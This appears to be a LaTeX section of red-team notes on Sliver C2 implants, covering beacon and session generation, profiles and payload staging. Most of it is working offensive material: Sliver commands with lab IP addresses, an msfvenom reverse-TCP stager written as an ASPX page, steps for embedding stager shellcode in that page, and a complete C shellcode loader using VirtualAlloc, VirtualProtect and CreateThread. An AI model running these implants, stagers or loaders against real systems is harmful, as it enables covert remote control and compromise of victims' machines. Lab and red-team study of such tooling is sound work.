\section{Implants}
\subsection{Introduction}
They offer network connections on different sets of protocols and a means of communication between a C2 server and the target workstation/server.

Implants can operate in:
\begin{itemize}
    \item beacon mode. Implant operates in intervals, resulting in the execution of commands at a set period.  Beacons can be upgraded to sessions.
    \item session mode enables the ability to have immediate execution of commands by the operator
\end{itemize} 

implants format are:
\begin{itemize}
    \item \verb+exe+ (default)
    \item \verb+shared+: for dynamic libraries
    \item \verb+service+: for a windows service binary to use with \verb+psexec+ 
    \item \verb+shellcode+:
\end{itemize}


\subsection{Beacon}

Generate:
\begin{verbatim}
generate beacon -N <beacon_name> --http <server_ip>:<port> --skip-symbols  
    --os windows --seconds <sec> --jitter <sec>
generate beacon -N <beacon_name> --mtls <server_ip>:<port> --skip-symbols  
    --os windows --seconds <sec> --jitter <sec>
\end{verbatim}

Reconfig:
\begin{verbatim}
reconfig -i 5s -j 1s
\end{verbatim}

Utilisation:
\begin{verbatim}
use <id>
\end{verbatim}


tasks performed:
\begin{verbatim}
tasks
tasks tetch <id>
\end{verbatim}


\verb+interactive+ enable session mode of a beacon. Actually it queue a task that will attempt to establish a session. By defaukt the session will be created with the same C2 protocol used by the beacon. another method can be specified by providine proper parameters to \verb+interactive+


\subsection{Session}
\begin{verbatim}
generate --http <server_ip>:<port> --skip-symbols -N <beacon_name> --os windows 
generate --mtls <server_ip>:<port> --skip-symbols -N <beacon_name> --os windows
\end{verbatim}

to stop using a session:
\begin{verbatim}
background
\end{verbatim}

to exit a session it must be killed
\begin{verbatim}
sessions -k <id>
\end{verbatim}

\subsection{Named pipes}
see pivot section


\subsection{Profiles}

allow to create beacon templates:
\begin{verbatim}    
profiles new beacon --arch amd64 --os windows --mtls 10.10.10.10:443 
    -f shellcode --evasion --timeout 300 --seconds 5 --jitter 1 <template_name>
\end{verbatim}

or session template:
\begin{verbatim}    
profiles new --arch amd64 --os windows --mtls 10.10.10.10:443  <template_name>
\end{verbatim}

to generate a beacon from a template
\begin{verbatim}
profiles generate --save . <template_name>
\end{verbatim}


\subsection{Staging}
For comparison see 
\href{https://blog.spookysec.net/stage-v-stageless-1/}{Staged vs Stageless Payloads}

\href{https://medium.com/@nickswink7/red-teaming-tactics-unlocking-the-power-of-custom-staged-payloads-w-metasploit-d3db71567572}{Red Teaming Tactics: Unlocking The Power of Custom Staged Payloads w/ Metasploit}

\href{https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/}{earning Sliver C2 (06) - Stagers: Basics}

As payloads can be pretty big (around 10MB), you may sometime require the use of \href{https://sliver.sh/docs?name=Stagers}{stagers} to execute your implant on a target system. Sliver supports the meterpreter staging protocol over TCP and HTTP(S). This protocol is pretty straight forward:
\begin{itemize}
    \item read the size of the stage 2 payload on the wire (the first 4 bytes for the TCP stager)
    \item download the stage 2
    \item allocate the size read in the first step, and write the stage in memory  
\end{itemize}

For this to work, we need the following pieces:
\begin{itemize}
    \item a staging server (the Sliver server)
    \item a stage 2 payload (usually a Sliver shellcode, but can be in other formats)
    \item stagers or dropper (generated by msfvenom, the Sliver generate stager command, or a custom one)
\end{itemize}

Sliver implements staging by reusing the profiles feature. Profiles are sorts of implant blueprints that define a configuration to be reused by the \verb+profiles new+ command.

\begin{verbatim}
profiles new -h
profiles new beacon --arch amd64 --os windows --mtls 10.10.69.24:443 
    -f shellcode --timeout 300 --seconds 5 --jitter 1 funnier_bytes
profiles new --http 10.10.14.62:8088 --format shellcode htb
\end{verbatim}

then create a stagging listener and link it to the profile
\begin{verbatim}
stage-listener --url http://10.10.69.24:8080 --profile funnier_bytes --prepend-size
stage-listener --url tcp://10.10.14.62:4443 --profile htb
\end{verbatim}

Then start the listener catch the stage 2 payload callback
\begin{verbatim}
mtls --lhost 10.10.69.24 --lport 443
http -L 10.10.14.62 -l 8088 --website delivery
\end{verbatim}

then generate the Generate a new sliver stager shellcode to include in the stager (msfvenom)
\begin{verbatim}
generate stager -r http --lhost 10.10.69.24 --lport 8080
generate stager --lhost 10.10.14.62 --lport 4443 --format csharp --save staged.txt
\end{verbatim}

generate a stager with msfvenom or develop or new one

\begin{verbatim}
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.62 LPORT=8088 -f aspx > sliver.aspx
\end{verbatim}


Next, we would need to take the generated payload in \verb+staged.txt+ and change the payload in the \verb+Page_Load+ function. The \verb+byte[]+ array will be defined with a different name; it is pretty important to put the \verb+new byte[511]+ array from \verb+staged.txt+ into the \verb+byte[] mO0UY+ declaration in the example below in the \verb+sliver.aspx+ file.
\begin{verbatim}
    protected void Page_Load(object sender, EventArgs e)
    {
        byte[] mO0UY = new byte[511] {0xfc,0x...
\end{verbatim}

Check \href{https://github.com/chvancooten/maldev-for-dummies}{Malware Development for Dummies} for more info on developing your own loaders and droppers.

\begin{verbatim}
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// change this out for the shellcode you're using!
unsigned char payload[3] = {
    0x90, 0x90, 0xcc
};
unsigned int payload_len = sizeof(payload);

int main(void) {
    
    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    // Allocate a memory buffer for payload
    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Copy payload to new buffer
    RtlMoveMemory(exec_mem, payload, payload_len);

    // Make new buffer as executable
    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

    // If VirtualProtect worked, run the payload
    if ( rv != 0 ) {
            th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
            WaitForSingleObject(th, -1);
    }

    return 0;
}
\end{verbatim}


